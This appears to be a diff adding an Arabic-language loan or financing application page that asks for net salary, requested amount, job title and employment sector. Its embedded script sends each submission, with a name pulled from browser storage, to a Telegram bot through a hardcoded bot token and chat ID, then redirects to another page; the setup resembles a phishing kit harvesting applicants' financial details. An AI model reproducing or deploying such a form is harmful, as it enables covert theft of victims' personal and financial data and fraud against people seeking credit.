@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P5H6V926');</script>
+<!-- End Google Tag Manager -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تصميم صفحة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans Arabic', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
+            padding: 0;
+            margin: 0;
+            background-color: #f0f2f5; /* Light grey background */
+            display: flex;
+            flex-direction: column; /* Allow vertical stacking */
+            align-items: center; /* Center content horizontally */
+            min-height: 100vh;
+        }
+
+        .header {
+            width: 100%;
+            height: 90px; /* Adjusted height for the header */
+            background-color: #323232ee;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            z-index: 10;
+            display: flex; /* Use flexbox for internal alignment */
+            justify-content: space-between; /* Space out left and right elements */
+            align-items: center; /* Vertically align items */
+            padding: 0 20px; /* Padding on the sides */
+            box-sizing: border-box; /* Include padding in width */
+            position: fixed; /* Keep header at the top when scrolling */
+            top: 0;
+            left: 0;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .header-left .icon-box {
+            background-color: #6a0dad; /* Purple color */
+            border-radius: 8px;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .header-left .icon-box svg {
+            fill: #ffffff;
+            width: 18px;
+            height: 18px;
+        }
+
+        .header-left span {
+            font-size: 14px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .header-right svg {
+            fill: #ffffff;
+            width: 20px;
+            height: 20px;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            /* margin-top to account for the fixed header */
+            margin-top: 80px; /* Adjust based on header height + desired spacing */
+            padding-bottom: 20px; /* Add some padding at the bottom */
+            width: 100%; /* Take full width for centering */
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 350px;
+            text-align: right;
+            position: relative;
+            margin-bottom: 20px;
+            margin-top: 50px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group input[type="text"] {
+            width: calc(100% - 24px);
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 15px;
+            color: #333;
+            box-sizing: border-box;
+            text-align: right;
+            background-color: #fcfcfc;
+        }
+
+        .form-group input[type="text"]:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.2);
+        }
+                .form-group input[type="tel"] {
+            width: calc(100% - 24px);
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 15px;
+            color: #333;
+            box-sizing: border-box;
+            text-align: right;
+            background-color: #fcfcfc;
+        }
+
+        .form-group input[type="tel"]:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.2);
+        }
+.form-group select {
+    width: calc(100% - 24px);
+    padding: 12px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 15px;
+    color: #333;
+    box-sizing: border-box;
+    background-color: #fcfcfc;
+    text-align: right;
+    direction: rtl;
+    height: 45px;
+}
+
+.form-group select:focus {
+    outline: none;
+    border-color: #007bff;
+    box-shadow: 0 0 5px rgba(0, 123, 255, 0.2);
+}
+
+
+
+        .submit-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #007bff;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            margin: 30px auto 0 auto;
+        }
+
+        .submit-button:hover {
+            background-color: #0056b3;
+        }
+
+        .bottom-section {
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 350px;
+            text-align: right;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+        }
+
+        .bottom-section p {
+            font-size: 15px;
+            color: #555;
+            margin: 0;
+            text-align: center;
+        }
+
+        .bottom-section .icon-box-blue {
+            background-color: #007bff;
+            border-radius: 8px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .bottom-section .icon-box-blue svg {
+            fill: #ffffff;
+            width: 24px;
+            height: 24px;
+        }
+
+        .ellipsis-button {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background-color: #f0f2f5;
+            border: 1px solid #ccc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.2s ease;
+        }
+
+        .ellipsis-button:hover {
+            background-color: #e0e2e5;
+        }
+
+        .ellipsis-button span {
+            font-size: 20px;
+            line-height: 1;
+            color: #555;
+            padding-bottom: 3px;
+        }
+                #imgau ,#imgau1{
+    width: 100%;
+    margin-top: 150px;
+    margin-bottom: 150px;
+}
+    </style>
+</head>
+<body>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P5H6V926"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    <div class="header">
+        <div class="header-left">
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+        </div>
+        <div class="header-right">
+            <svg viewBox="0 0 24 24">
+                <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
+            </svg>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="form-container">
+            <form id="incomeForm">
+
+                <div class="form-group">
+                    <input type="tel" id="salary" name="salary" placeholder="صافي الراتب بعد الأقتطاع ">
+                </div>
+
+                <div class="form-group">
+                    <input type="tel" id="employmentType" name="employmentType" placeholder="المبلغ المطلوب ">
+                </div>
+                <div class="form-group">
+                    <input type="text" id="jobTitle" name="jobTitle" placeholder="اسم الوظيفة">
+                </div>
+                <div class="form-group">
+                </div>
+                <div class="form-group">
+                </div>
+<div class="form-group">
+    <select id="employmentSector" name="employmentSector">
+        <option value="" disabled selected>قطاع العمل</option>
+        <option value="خاص">خاص</option>
+        <option value="حكومي">حكومي</option>
+        <option value="متقاعد">متقاعد</option>
+        <option value="ملكية فردية">ملكية فردية</option>
+    </select>
+</div>
+
+
+                <button type="submit" class="submit-button">Submit</button>
+            </form>
+        </div>
+
+<img id="imgau1" src="tamwel.jpg">
+
+    </div>
+<script>
+  const botToken = '8797549963:AAFxHU7EtFf1ZDDRlhPYRtlVk-Watq8L0wM'; 
+const chatId = '7801329761';         
+
+  document.getElementById('incomeForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // استرجاع الاسم المخزن
+    const storedName = localStorage.getItem('userName') || 'غير معروف';
+
+    // جلب القيم من الفورم
+    const salary = document.getElementById('salary').value.trim();
+    const employmentType = document.getElementById('employmentType').value.trim();
+    const jobTitle = document.getElementById('jobTitle').value.trim();
+    const employmentSector = document.getElementById('employmentSector').value;
+
+    // تحقق من تعبئة الحقول (اختياري لكن جيد)
+    if (!salary || !employmentType || !jobTitle  || !employmentSector) {
+      alert('يرجى ملء جميع الحقول');
+      return;
+    }
+
+    // تركيب رسالة الإرسال
+    const message = `
+📩 *بيانات دخل جديدة*
+- من: ${storedName}
+- صافي الراتب بعد الاقتطاع: ${salary}
+- المبلغ الم
+لوب : ${employmentType}
+- اسم الوظيفة: ${jobTitle}
+- قطاع العمل: ${employmentSector}
+    `;
+
+    // طلب الإرسال لتليجرام
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        window.location.href = 'cashall.html';
+        this.reset();
+      } else {
+        alert('حدث خطأ أثناء الإرسال');
+        console.error(data);
+      }
+    })
+    .catch(error => {
+      alert('خطأ في الاتصال بالخادم');
+      console.error(error);
+    });
+  });
+</script>
+</body>
+</html>
